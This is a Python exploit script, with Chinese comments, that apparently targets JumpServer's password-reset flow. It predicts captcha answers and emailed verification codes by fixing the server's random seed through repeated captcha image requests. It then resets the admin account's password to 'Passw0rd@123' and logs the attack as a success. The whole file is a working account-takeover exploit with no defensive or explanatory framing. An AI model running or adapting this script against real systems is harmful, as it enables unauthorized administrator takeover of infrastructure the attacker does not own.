import logging
import string
import struct
import random
import sys
from urllib.parse import urljoin

import coloredlogs as coloredlogs

import requests
import json

string_punctuation = '!#$%&()*+,-.:;<=>?@[]^_~'
proxies = {
    "http": "127.0.0.1:8081",
    "https": "127.0.0.1:8081"
}

headers = {
"Host":"127.0.0.1:8080",
"Content-Length":"144",
"Cache-Control":"max-age=0",
"Upgrade-Insecure-Requests":"1",
"Origin":"http://127.0.0.1:8080",
"Content-Type":"application/x-www-form-urlencoded",
"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36",
"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"Referer":"http://127.0.0.1:8080/core/auth/password/forget/previewing/",
"Accept-Encoding":"gzip, deflate",
"Accept-Language":"zh-CN,zh;q=0.9",
}



def nop_random(seed: str):  #此处为生成code和图片噪点所进行的随机数产生
    random.seed(seed)
    #模拟图片的生成
    for i in range(4): #此处是对图片当中的字符进行角度旋转，总计旋转4个
        random.randrange(-35, 35)

    for p in range(int(180 * 38 * 0.1)): #模拟噪点生成的次数
        random.randint(0, 180)
        random.randint(0, 38)


def fix_seed(target: str, seed: str):
    def _request(i: int, u: str):
        #logging.info('send %d request to %s', i, u)
        response = requests.get(u, timeout=5)
        assert response.status_code == 200
        assert response.headers['Content-Type'] == 'image/png'

    url = urljoin(target, '/core/auth/captcha/image/' + seed + '/')
    for idx in range(30):
        _request(idx, url) #这里重复30次的目的是为了将多个进程当中的种子固定


def send_code(target: str, email: str, reset_token: str):
    url = urljoin(target, "/api/v1/authentication/password/reset-code/?token=" + reset_token)
    response = r2.post(url, json={
        'email': email,
        'sms': '',
        'form_type': 'email',
    }, allow_redirects=False)

    #将输入进行固定传输
    assert response.status_code == 200
    logger.info("Send code suzz")
def math_challenge():
    operators = ("+", "*", "-")
    operands = (random.randint(1, 10), random.randint(1, 10))
    operator = random.choice(operators)
    if operands[0] < operands[1] and "-" == operator:
        operands = (operands[1], operands[0])
    challenge = "%d%s%d" % (operands[0], operator, operands[1])
    return (
        "{}=".format(challenge),
        str(eval(challenge)),
    )
def random_string(length: int, lower=True, upper=True, digit=True, special_char=False):
    args_names = ['lower', 'upper', 'digit', 'special_char']
    args_values = [lower, upper, digit, special_char]
    args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation]
    args_string_map = dict(zip(args_names, args_string))
    kwargs = dict(zip(args_names, args_values))
    kwargs_keys = list(kwargs.keys())
    kwargs_values = list(kwargs.values())
    args_true_count = len([i for i in kwargs_values if i])
    assert any(kwargs_values), f'Parameters {kwargs_keys} must have at least one `True`'
    assert length >= args_true_count, f'Expected length >= {args_true_count}, bug got {length}'

    can_startswith_special_char = args_true_count == 1 and special_char

    chars = ''.join([args_string_map[k] for k, v in kwargs.items() if v])

    while True:
        password = list(random.choice(chars) for i in range(length))
        for k, v in kwargs.items():
            if v and not (set(password) & set(args_string_map[k])):
                # 没有包含指定的字符, retry
                break
        else:
            if not can_startswith_special_char and password[0] in args_string_map['special_char']:
                # 首位不能为特殊字符, retry
                continue
            else:
                # 满足要求终止 while 循环
                break

    password = ''.join(password)
    return password
def setup_color_logging():
    logging.basicConfig()
    logger = logging.getLogger(name='mylogger')

    coloredlogs.install(logger=logger)
    logger.propagate = False  # 确保 coloredlogs 不会将我们的日志事件传递给根 logger，这可以防止我们重复记录每个事件

    ## 配置 颜色
    coloredFormatter = coloredlogs.ColoredFormatter(
        fmt='[%(name)s] %(asctime)s %(funcName)s %(lineno)-3d  %(message)s',
        level_styles=dict(
            debug=dict(color='white'),
            info=dict(color='blue'),
            warning=dict(color='yellow', bright=True),
            error=dict(color='red', bold=True, bright=True),
            critical=dict(color='black', bold=True, background='red'),
        ),
        field_styles=dict(
            name=dict(color='white'),
            asctime=dict(color='white'),
            funcName=dict(color='white'),
            lineno=dict(color='white'),
        )
    )

    ## 配置 StreamHandler
    ch = logging.StreamHandler(stream=sys.stdout)
    ch.setFormatter(fmt=coloredFormatter)
    logger.addHandler(hdlr=ch)
    logger.setLevel(level=logging.DEBUG)

    return logger

# 日志记录器对象
logger = setup_color_logging()

if __name__ == '__main__':
    target = "http://127.0.0.1:8080"
    # #第一个过程获取seed

    r=requests.session()
    r1=r.get(target + "/core/auth/password/forget/previewing/")
    data= r1.text


    import re
    hashkey_regx= re.compile(r'image/(.*?)/" alt="captcha"',re.I)
    csrfToken_regx= re.compile(r'"csrfmiddlewaretoken" value="(.*?)">',re.I)

    seed=hashkey_regx.findall(data)[0]
    csrfToken=csrfToken_regx.findall(data)[0]

    logger.info("Got Seed: %s",seed)
    logger.info("Got csrfToken: %s",csrfToken)


    # #2固定seed，以求预测验证码的答案
    fix_seed(target,seed) #这当中有target和seed
    #jumpserver 进行的运算
    random.seed(seed)
    nop_random(seed)
    challenge, response=math_challenge()
    #此处为验证码的答案
    logger.info("Calculate CodeKey： %s",response)


    # #刷新验证码，并获取其中的hashkey
    hashkey = json.loads(str(requests.get(target+"/core/auth/captcha/refresh/",headers={"X-Requested-With":"XMLHttpRequest"}).text))["key"]
    logger.info("Got Hashkey: %s", hashkey)

    # 提交hashkey和对应的答案，获取重置的链接
    x=r.post(target+"/core/auth/password/forget/previewing/",data='csrfmiddlewaretoken={}&username=admin&captcha_0={}&captcha_1={}'.format(csrfToken,hashkey,response),headers=headers,allow_redirects=False)
    if int (x.status_code) !=302:
        logger.info("计算出错，请重新运行脚本")
        sys.exit()
    Location = x.headers["location"]
    code =Location.split("token=")[-1]

    logger.info("Got ForgetPassword Location: %s",Location)
    logger.info("Got Code: %s",code)

    #刷新 csrfToken
    r2 = requests.session()
    ya = r2.get(target+Location)
    data = ya.text
    csrfToken = csrfToken_regx.findall(data)[0]
    logger.info("ReGot csrfToken: %s", csrfToken)

    # 固定seed
    fix_seed(target, seed)  # 这当中有target和seed
    nop_random(seed)
    send_code(target + Location, "admin@mycomany.com", code) #必须要有的，不然就是会产生错误的地方。
    # 此处预测验证码的数据
    code = random_string(6, lower=False, upper=False)  # 生成随机的验证码

    logger.info("verify Code: %s", code)




    # 提交验证码
    y=r2.post(target+Location,data='csrfmiddlewaretoken={}&form_type=email&email=admin%40mycomany.com&sms=&code={}'.format(csrfToken,code),headers=headers,allow_redirects=False)
    reset_Location = y.headers["location"]

    logger.info("Got resetPassword url :%s","http://127.0.0.1:8080"+reset_Location)

    # #重置密码
    #
    y = r2.get(target+reset_Location)
    y2= r2.post(target+reset_Location,data='csrfmiddlewaretoken={}&new_password=Passw0rd@123&confirm_password=Passw0rd@123'.format(csrfToken),headers=headers,allow_redirects=False)
    if y2.status_code == 302:
        logger.info("Attack suzz password is Passw0rd@123" )